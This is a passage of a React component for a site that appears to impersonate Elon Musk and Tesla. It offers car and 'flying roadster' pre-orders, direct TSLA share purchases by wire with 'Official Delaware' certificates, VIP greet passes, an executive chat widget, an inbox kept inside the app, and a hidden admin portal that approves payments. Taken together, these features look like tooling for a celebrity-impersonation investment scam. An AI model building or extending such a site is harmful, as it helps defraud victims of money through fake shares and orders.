    setCustomCars((prev) => prev.filter((c) => c.id !== carId));
  };

  // In-App Messaging handlers
  const handleSendInboxMessage = (subject: string, body: string, category: InAppInboxMessage['category']) => {
    const newMsg: InAppInboxMessage = {
      id: `msg-visitor-${Date.now()}`,
      sender: 'visitor',
      senderName: 'Visitor In-App Inquiry',
      subject,
      body,
      category,
      read: true,
      timestamp: new Date().toISOString(),
      timeStr: 'Just now',
      replies: [],
    };
    setInboxMessages((prev) => [newMsg, ...prev]);

    // Interactive in-app acknowledgement
    setTimeout(() => {
      setInboxMessages((current) =>
        current.map((m) =>
          m.id === newMsg.id
            ? {
                ...m,
                replies: [
                  ...(m.replies || []),
                  {
                    id: `reply-auto-${Date.now()}`,
                    sender: 'concierge',
                    senderName: 'Executive Concierge Desk',
                    body: 'Your message has been received by the Executive Concierge & Admin Approval Desk. All responses will appear right here in your in-app inbox without needing external email.',
                    timestamp: new Date().toISOString(),
                    timeStr: 'Just now',
                  },
                ],
              }
            : m
        )
      );
    }, 1000);
  };

  const handleSendInboxReply = (messageId: string, replyText: string) => {
    setInboxMessages((prev) =>
      prev.map((m) => {
        if (m.id === messageId) {
          const newReply: InAppReply = {
            id: `reply-${Date.now()}`,
            sender: 'visitor',
            senderName: 'Visitor (You)',
            body: replyText,
            timestamp: new Date().toISOString(),
            timeStr: 'Just now',
          };
          return { ...m, replies: [...(m.replies || []), newReply] };
        }
        return m;
      })
    );
  };

  const handleSendAdminReply = (messageId: string, replyText: string) => {
    setInboxMessages((prev) =>
      prev.map((m) => {
        if (m.id === messageId) {
          const newReply: InAppReply = {
            id: `reply-admin-${Date.now()}`,
            sender: 'admin',
            senderName: 'Executive Admin Desk',
            body: replyText,
            timestamp: new Date().toISOString(),
            timeStr: 'Just now',
          };
          return { ...m, read: false, replies: [...(m.replies || []), newReply] };
        }
        return m;
      })
    );
  };

  const handleMarkInboxAsRead = (messageId: string) => {
    setInboxMessages((prev) =>
      prev.map((m) => (m.id === messageId ? { ...m, read: true } : m))
    );
  };

  const handlePreOrderFlyingRoadster = () => {
    const roadster = allVehicles.find((v) => v.id === 'tesla-flying-roadster') || allVehicles[0];
    setOrderingVehicle(roadster);
  };

  const handleResetAll = () => {
    if (window.confirm('Reset all models (Profile, Companies, Specs, and Gallery) back to original state?')) {
      setProfile(INITIAL_PROFILE);
      setCompanies(INITIAL_COMPANIES);
      setSpecs(INITIAL_FLYING_CAR_SPECS);
      setGallery(INITIAL_GALLERY);
      setCustomCars([]);
      setInboxMessages(INITIAL_INBOX_MESSAGES);
      localStorage.clear();
    }
  };

  const unreadInboxCount = inboxMessages.filter((m) => !m.read).length;

  return (
    <div className="relative min-h-screen bg-[#040a18] text-slate-100 flex flex-col font-sans selection:bg-blue-600/30 selection:text-blue-200">
      {/* Global Main Page Background Photo Layer */}
      <div className="fixed inset-0 pointer-events-none select-none z-0 overflow-hidden" aria-hidden="true">
        <img
          src="/assets/aistudio/elonxxx0_5bf1f316.jpg"
          alt=""
          referrerPolicy="no-referrer"
          className="w-full h-full object-cover object-top opacity-20 brightness-75 contrast-105"
        />
        <div className="absolute inset-0 bg-gradient-to-b from-[#040a18]/80 via-[#040a18]/75 to-[#040a18]/95" />
      </div>

      {/* Unified Navigation Header: Lists all features at top right with US patriotic accents */}
      <Navbar
        onOpenContentStudio={() => setIsContentStudioOpen(true)}
        onOpenRsvp={() => setIsRsvpOpen(true)}
        onOpenMyOrders={() => setIsMyOrdersOpen(true)}
        onPreOrderRoadster={handlePreOrderFlyingRoadster}
        onOpenInbox={() => setIsInboxOpen(true)}
        inboxUnreadCount={unreadInboxCount}
        onOpenAdminPortal={() => setIsAdminPortalOpen(true)}
        galleryCount={gallery.length}
        ordersCount={orders.length}
        isAdmin={isAdmin}
        activePage={activePage}
        onSelectPage={handleSelectPage}
        viewMode={viewMode}
        onToggleViewMode={() => setViewMode((prev) => (prev === 'paged' ? 'scroll' : 'paged'))}
      />

      {/* Main Content Sections: Arranged Page-by-Page with distinct commands */}
      <main className="flex-1 relative z-10">
        {viewMode === 'paged' ? (
          <div 
            key={`${activePage}-${slideDirection}`} 
            className={`w-full overflow-hidden ${slideDirection === 'forward' ? 'animate-slide-in-forward' : 'animate-slide-in-backward'}`}
          >
            {activePage === 'executive' && (
              <HeroSection
                profile={profile}
                onOpenGallery={() => handleSelectPage('gallery')}
                onOpenRsvp={() => setIsRsvpOpen(true)}
                onEditProfile={() => setIsContentStudioOpen(true)}
                onSelectPage={handleSelectPage}
              />
            )}

            {activePage === 'enterprises' && (
              <AboutCompaniesSection
                profile={profile}
                companies={companies}
                onOpenContentStudio={() => setIsContentStudioOpen(true)}
                onSelectPage={handleSelectPage}
              />
            )}

            {activePage === 'flying-roadster' && (
              <FlyingRoadsterSection
                specs={specs}
                onOpenContentStudio={() => setIsContentStudioOpen(true)}
                onPreOrderFlyingCar={handlePreOrderFlyingRoadster}
                onSelectPage={handleSelectPage}
              />
            )}

            {activePage === 'showroom' && (
              <TeslaShowroomSection
                vehicles={allVehicles}
                onSelectVehicleToOrder={(vehicle) => setOrderingVehicle(vehicle)}
                onOpenMyOrders={() => setIsMyOrdersOpen(true)}
                ordersCount={orders.length}
                onSelectPage={handleSelectPage}
              />
            )}

            {activePage === 'shares' && (
              <TeslaSharesSection
                onOpenPurchaseModal={(qty) => {
                  setShareModalInitialQty(qty || 25);
                  setIsShareModalOpen(true);
                }}
                onViewCertificateSample={() => {
                  setSelectedShareCertOrder({
                    orderId: 'TSLA-SAMPLE',
                    certificateNumber: 'TSLA-DRS-2026-894102',
                    shareQuantity: 100,
                    sharePrice: simulatedSharePrice,
                    totalInvestment: Math.round(100 * simulatedSharePrice * 100) / 100,
                    custodyType: 'drs_computershare',
                    investorName: profile.name || 'Elon Musk',
                    investorEmail: 'shareholder@tesla.com',
                    investorPhone: '+1 (512) 555-0199',
                    investorType: 'individual',
                    paymentMethod: 'wire',
                    paymentStatus: 'approved',
                    orderDate: new Date().toLocaleDateString(),
                    approvalNotes: 'Official Delaware Archival Sample Certificate'
                  });
                }}
                onSelectPage={handleSelectPage}
                approvedSharesCount={shareOrders.filter(s => s.paymentStatus === 'approved').length}
                simulatedSharePrice={simulatedSharePrice}
                onAdjustSimulatedPrice={(nextPrice) =>
                  setSimulatedSharePrice(Math.min(450, Math.max(150, Math.round(nextPrice * 100) / 100)))
                }
                isMarketSimRunning={isMarketSimRunning}
                onToggleMarketSim={() => setIsMarketSimRunning((prev) => !prev)}
                priceAlerts={priceAlerts}
                onCreatePriceAlert={handleCreatePriceAlert}
                onDeletePriceAlert={handleDeletePriceAlert}
                onOpenInbox={() => setIsInboxOpen(true)}
              />
            )}

            {activePage === 'gallery' && (
              <GallerySection
                gallery={gallery}
                onOpenLightbox={(index) => setLightboxIndex(index)}
                onEditCaption={(item) => setEditingItem(item)}
                onAddNewPhoto={() => setIsAddPhotoOpen(true)}
                onResetGallery={handleResetGallery}
                onSelectPage={handleSelectPage}
              />
            )}

            {/* Bottom Chapter Control Dock for this page */}
            <PagePaginationFooter
              activePage={activePage}
              onSelectPage={handleSelectPage}
              onPrimaryAction={handlePrimaryAction}
            />
          </div>
        ) : (
          /* Continuous Scroll Mode */
          <div>
            <HeroSection
              profile={profile}
              onOpenGallery={() => handleSelectPage('gallery')}
              onOpenRsvp={() => setIsRsvpOpen(true)}
              onEditProfile={() => setIsContentStudioOpen(true)}
              onSelectPage={handleSelectPage}
            />
            <AboutCompaniesSection
              profile={profile}
              companies={companies}
              onOpenContentStudio={() => setIsContentStudioOpen(true)}
              onSelectPage={handleSelectPage}
            />
            <FlyingRoadsterSection
              specs={specs}
              onOpenContentStudio={() => setIsContentStudioOpen(true)}
              onPreOrderFlyingCar={handlePreOrderFlyingRoadster}
              onSelectPage={handleSelectPage}
            />
            <TeslaShowroomSection
              vehicles={allVehicles}
              onSelectVehicleToOrder={(vehicle) => setOrderingVehicle(vehicle)}
              onOpenMyOrders={() => setIsMyOrdersOpen(true)}
              ordersCount={orders.length}
              onSelectPage={handleSelectPage}
            />
            <TeslaSharesSection
              onOpenPurchaseModal={(qty) => {
                setShareModalInitialQty(qty || 25);
                setIsShareModalOpen(true);
              }}
              onViewCertificateSample={() => {
                setSelectedShareCertOrder({
                  orderId: 'TSLA-SAMPLE',
                  certificateNumber: 'TSLA-DRS-2026-894102',
                  shareQuantity: 100,
                  sharePrice: simulatedSharePrice,
                  totalInvestment: Math.round(100 * simulatedSharePrice * 100) / 100,
                  custodyType: 'drs_computershare',
                  investorName: profile.name || 'Elon Musk',
                  investorEmail: 'shareholder@tesla.com',
                  investorPhone: '+1 (512) 555-0199',
                  investorType: 'individual',
                  paymentMethod: 'wire',
                  paymentStatus: 'approved',
                  orderDate: new Date().toLocaleDateString(),
                  approvalNotes: 'Official Delaware Archival Sample Certificate'
                });
              }}
              onSelectPage={handleSelectPage}
              approvedSharesCount={shareOrders.filter(s => s.paymentStatus === 'approved').length}
              simulatedSharePrice={simulatedSharePrice}
              onAdjustSimulatedPrice={(nextPrice) =>
                setSimulatedSharePrice(Math.min(450, Math.max(150, Math.round(nextPrice * 100) / 100)))
              }
              isMarketSimRunning={isMarketSimRunning}
              onToggleMarketSim={() => setIsMarketSimRunning((prev) => !prev)}
              priceAlerts={priceAlerts}
              onCreatePriceAlert={handleCreatePriceAlert}
              onDeletePriceAlert={handleDeletePriceAlert}
              onOpenInbox={() => setIsInboxOpen(true)}
            />
            <GallerySection
              gallery={gallery}
              onOpenLightbox={(index) => setLightboxIndex(index)}
              onEditCaption={(item) => setEditingItem(item)}
              onAddNewPhoto={() => setIsAddPhotoOpen(true)}
              onResetGallery={handleResetGallery}
              onSelectPage={handleSelectPage}
            />
          </div>
        )}
      </main>

      {/* Footer */}
      <Footer
        onOpenContentStudio={() => setIsContentStudioOpen(true)}
        onOpenRsvp={() => setIsRsvpOpen(true)}
        onSelectPage={handleSelectPage}
      />

      {/* Interactive Lightbox Modal */}
      {lightboxIndex !== null && (
        <LightboxModal
          isOpen={lightboxIndex !== null}
          currentIndex={lightboxIndex}
          gallery={gallery}
          onClose={() => setLightboxIndex(null)}
          onNavigate={(newIndex) => setLightboxIndex(newIndex)}
          onEditCaption={(item) => {
            setEditingItem(item);
          }}
        />
      )}

      {/* Custom Caption Editor Modal */}
      {editingItem && (
        <CaptionEditorModal
          isOpen={editingItem !== null}
          item={editingItem}
          onClose={() => setEditingItem(null)}
          onSave={handleSaveCaption}
        />
      )}

      {/* Add Photo Modal */}
      <AddPhotoModal
        isOpen={isAddPhotoOpen}
        onClose={() => setIsAddPhotoOpen(false)}
        onAdd={handleAddPhoto}
      />

      {/* Tesla Vehicle Ordering & Pre-Order Modal */}
      <TeslaOrderModal
        isOpen={orderingVehicle !== null}
        vehicle={orderingVehicle}
        onClose={() => setOrderingVehicle(null)}
        onOrderCompleted={handleOrderCompleted}
      />

      {/* My Active Tesla Orders Tracker Modal */}
      <MyOrdersModal
        isOpen={isMyOrdersOpen}
        onClose={() => setIsMyOrdersOpen(false)}
        orders={orders}
        onCancelOrder={handleCancelOrder}
        onUpdateOrderStatus={handleUpdateOrderStatus}
        onOpenInbox={() => setIsInboxOpen(true)}
        onOrderNewCar={() => {
          handleSelectPage('showroom');
        }}
      />

      {/* In-App Messaging & Threaded Communication Modal (No 3rd Party) */}
      <InAppInboxModal
        isOpen={isInboxOpen}
        onClose={() => setIsInboxOpen(false)}
        messages={inboxMessages}
        onSendMessage={handleSendInboxMessage}
        onSendReply={handleSendInboxReply}
        onMarkAsRead={handleMarkInboxAsRead}
      />

      {/* Hidden Admin Portal: Payment Approvals, New Car Listings & Admin Replies */}
      <HiddenAdminPortalModal
        isOpen={isAdminPortalOpen}
        onClose={() => setIsAdminPortalOpen(false)}
        orders={orders}
        vehicles={allVehicles}
        customCars={customCars}
        inboxMessages={inboxMessages}
        shareOrders={shareOrders}
        onApprovePayment={handleApprovePayment}
        onRejectPayment={handleRejectPayment}
        onUpdateOrderStatus={handleUpdateOrderStatus}
        onApproveShareOrder={handleApproveShareOrder}
        onRejectShareOrder={handleRejectShareOrder}
        onAddNewCar={handleAddNewCar}
        onDeleteCustomCar={handleDeleteCustomCar}
        onSendAdminReply={handleSendAdminReply}
        onSendSystemBroadcast={(subject, body) => {
          const bcast: InAppInboxMessage = {
            id: `msg-bcast-${Date.now()}`,
            sender: 'admin',
            senderName: 'Tesla Executive Command',
            subject,
            body,
            category: 'general',
            read: false,
            timestamp: new Date().toISOString(),
            timeStr: 'Just now',
            replies: [],
          };
          setInboxMessages((prev) => [bcast, ...prev]);
        }}
      />

      {/* TSLA Share Direct Purchase Modal */}
      <TeslaSharePurchaseModal
        isOpen={isShareModalOpen}
        onClose={() => setIsShareModalOpen(false)}
        initialQuantity={shareModalInitialQty}
        currentSharePrice={simulatedSharePrice}
        onOrderCompleted={handleShareOrderCompleted}
        onViewCertificate={(order) => {
          setSelectedShareCertOrder(order);
        }}
      />

      {/* Official Delaware Stock Ownership Certificate Modal */}
      <ShareCertificateModal
        isOpen={selectedShareCertOrder !== null}
        onClose={() => setSelectedShareCertOrder(null)}
        order={selectedShareCertOrder}
      />

      {/* Content Studio & Django Admin Simulator Modal */}
      <ContentStudioModal
        isOpen={isContentStudioOpen}
        onClose={() => setIsContentStudioOpen(false)}
        profile={profile}
        companies={companies}
        specs={specs}
        gallery={gallery}
        onUpdateProfile={setProfile}
        onUpdateCompanies={setCompanies}
        onUpdateSpecs={setSpecs}
        onUpdateGallery={setGallery}
        onEditGalleryItem={(item) => setEditingItem(item)}
        onAddNewPhoto={() => setIsAddPhotoOpen(true)}
        onResetAll={handleResetAll}
      />

      {/* VIP RSVP Greet Pass Modal */}
      <RsvpModal
        isOpen={isRsvpOpen}
        onClose={() => setIsRsvpOpen(false)}
      />

      {/* Floating Notification-Based Executive Chat Widget */}
      <ExecutiveChatWidget
        onOpenVipModal={() => setIsRsvpOpen(true)}
        onOpenTeslaOrderModal={(v) => setOrderingVehicle(v || allVehicles[0])}
        onAddOrderDirect={handleOrderCompleted}
      />
    </div>
  );
}
